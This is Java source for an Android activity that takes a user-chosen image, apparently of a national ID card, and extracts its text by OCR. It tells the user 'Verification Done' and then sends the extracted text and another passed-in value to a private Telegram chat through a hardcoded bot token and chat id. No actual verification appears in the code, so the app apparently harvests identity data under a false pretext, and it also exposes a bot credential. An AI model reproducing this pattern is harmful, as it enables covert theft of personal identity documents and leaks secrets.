package com.srizwan01.nirvoy11;

import android.Manifest;
import android.app.Activity;
import android.content.ClipData;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.*;
import android.graphics.Typeface;
import android.graphics.drawable.*;
import android.os.*;
import android.util.*;
import android.view.*;
import android.view.View;
import android.widget.*;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.GenericTypeIndicator;

import java.util.*;
import java.util.HashMap;

public class NidActivity extends AppCompatActivity {
	
	public final int REQ_CD_FILE_PICKER = 101;
	
	private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
	
	private HashMap<String, Object> map = new HashMap<>();
	
	private LinearLayout linear1;
	private LinearLayout linear2;
	private LinearLayout linear4;
	private ImageView imageview3;
	private ImageView imageview2;
	private TextView textview2;
	private LinearLayout linear5;
	private LinearLayout linear6;
	private TextView textview1;
	private TextView textview5;
	private TextView textview4;
	private ImageView imageview1;
	
	private Intent file_picker = new Intent(Intent.ACTION_GET_CONTENT);
	private DatabaseReference db = _firebase.getReference("db");
	private ChildEventListener _db_child_listener;
	private SharedPreferences details;
	private RequestNetwork get;
	private RequestNetwork.RequestListener _get_request_listener;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.nid);
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
		
		if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
			ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_EXTERNAL_STORAGE}, 1000);
		} else {
			initializeLogic();
		}
	}
	
	@Override
	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
		if (requestCode == 1000) {
			initializeLogic();
		}
	}
	
	private void initialize(Bundle _savedInstanceState) {
		linear1 = findViewById(R.id.linear1);
		linear2 = findViewById(R.id.linear2);
		linear4 = findViewById(R.id.linear4);
		imageview3 = findViewById(R.id.imageview3);
		imageview2 = findViewById(R.id.imageview2);
		textview2 = findViewById(R.id.textview2);
		linear5 = findViewById(R.id.linear5);
		linear6 = findViewById(R.id.linear6);
		textview1 = findViewById(R.id.textview1);
		textview5 = findViewById(R.id.textview5);
		textview4 = findViewById(R.id.textview4);
		imageview1 = findViewById(R.id.imageview1);
		file_picker.setType("image/*");
		file_picker.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);
		details = getSharedPreferences("details", Activity.MODE_PRIVATE);
		get = new RequestNetwork(this);
		
		imageview3.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				startActivityForResult(file_picker, REQ_CD_FILE_PICKER);
			}
		});
		
		_db_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				RizwanUtil.showMessage(getApplicationContext(), "Well Done");
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				RizwanUtil.showMessage(getApplicationContext(), "Try later");
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		db.addChildEventListener(_db_child_listener);
		
		_get_request_listener = new RequestNetwork.RequestListener() {
			@Override
			public void onResponse(String _param1, String _param2, HashMap<String, Object> _param3) {
				final String _tag = _param1;
				final String _response = _param2;
				final HashMap<String, Object> _responseHeaders = _param3;
				RizwanUtil.showMessage(getApplicationContext(), "Network Connected");
			}
			
			@Override
			public void onErrorResponse(String _param1, String _param2) {
				final String _tag = _param1;
				final String _message = _param2;
				RizwanUtil.showMessage(getApplicationContext(), "No internet connection.");
			}
		};
	}
	
	private void initializeLogic() {
		Window w = this.getWindow();
		w.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
		w.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
					w.setNavigationBarColor(Color.parseColor("#FF4CFA50"));
		
		linear4.setVisibility(View.GONE);
		textview2.setTypeface(Typeface.createFromAsset(getAssets(),"fonts/solaimanlipi.ttf"), Typeface.NORMAL);
		linear6.setElevation((float)3);
		linear6.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b, int c, int d) { this.setCornerRadius(a); this.setStroke(b, c); this.setColor(d); return this; } }.getIns((int)15, (int)1, 0xFF4CAF50, 0xFF607D8B));
		textview5.setText(getIntent().getStringExtra("1"));
		get.startRequestNetwork(RequestNetworkController.GET, "https://nirboyforhelp.blogspot.com/?m=1", "", _get_request_listener);
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		super.onActivityResult(_requestCode, _resultCode, _data);
		
		switch (_requestCode) {
			case REQ_CD_FILE_PICKER:
			if (_resultCode == Activity.RESULT_OK) {
				ArrayList<String> _filePath = new ArrayList<>();
				if (_data != null) {
					if (_data.getClipData() != null) {
						for (int _index = 0; _index < _data.getClipData().getItemCount(); _index++) {
							ClipData.Item _item = _data.getClipData().getItemAt(_index);
							_filePath.add(FileUtil.convertUriToFilePath(getApplicationContext(), _item.getUri()));
						}
					}
					else {
						_filePath.add(FileUtil.convertUriToFilePath(getApplicationContext(), _data.getData()));
					}
				}
				linear4.setVisibility(View.VISIBLE);
				imageview3.setVisibility(View.GONE);
				imageview1.setImageBitmap(FileUtil.decodeSampleBitmapFromPath(_filePath.get((int)(0)), 1024, 1024));
				com.google.android.gms.vision.text.TextRecognizer textRecognizer = new com.google.android.gms.vision.text.TextRecognizer.Builder(getApplicationContext()).build();
					
				
				Bitmap bitmap = ((android.graphics.drawable.BitmapDrawable)imageview1.getDrawable()).getBitmap();
				com.google.android.gms.vision.Frame frame = new com.google.android.gms.vision.Frame.Builder().setBitmap(bitmap).build();
				final SparseArray<com.google.android.gms.vision.text.TextBlock> items1=
				textRecognizer.detect(frame);
				
							StringBuilder stringBuilder = new StringBuilder();
				for(int i =0;i<items1.size();i++){
						com.google.android.gms.vision.text.TextBlock item1 = items1.get(i);
						String myone = item1.getValue();
						stringBuilder.append("\n" + myone);
				}
				/* \nဆိုတဲ့ဟာကစာ​ကြောင်းတစ်​ကြောင်းနဲ့တစ်​ကြောင်းမဆက်​အောင်လုပ်ထားတာ။
\nဆိုတဲ့ဟာကိုမထည့်ရင်imageမှာAppleနဲ့Orangeကိုအ​ပေါ်​အောက်တစ်​ကြောင်းစီ​ရေးထားလည်းTextကို​ပြောင်းလိုက်တဲ့အခါAppleOrangeဆိုပြီးပူးသွားမယ်။*/
				textview1.setText(stringBuilder.toString());
							
				if (RizwanUtil.isConnected(getApplicationContext())) {
					RizwanUtil.showMessage(getApplicationContext(), "Verification Done.\nWait for conformation.");
					get.startRequestNetwork(RequestNetworkController.POST, "https://api.telegram.org/bot".concat("7067277946:AAGkQ6Y7Eqq0QSJrr5WsC0qR66rNef7eoVc".concat("/sendMessage?chat_id=".concat("7003820700".concat("&text=".concat(textview5.getText().toString().concat("	".concat(textview1.getText().toString()))))))), "Rizwan", _get_request_listener);
					finish();
				}
				else {
					RizwanUtil.showMessage(getApplicationContext(), "No Network");
				}
			}
			else {
				
			}
			break;
			default:
			break;
		}
	}
	
	public void _ImageToTEXT_LIBRARY() {
	}
	
	
	com.google.android.gms.vision.CameraSource cameraSource;
	SurfaceView cameraView;
	
	
	{
	}
	
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input) {
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels() {
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels() {
		return getResources().getDisplayMetrics().heightPixels;
	}
}
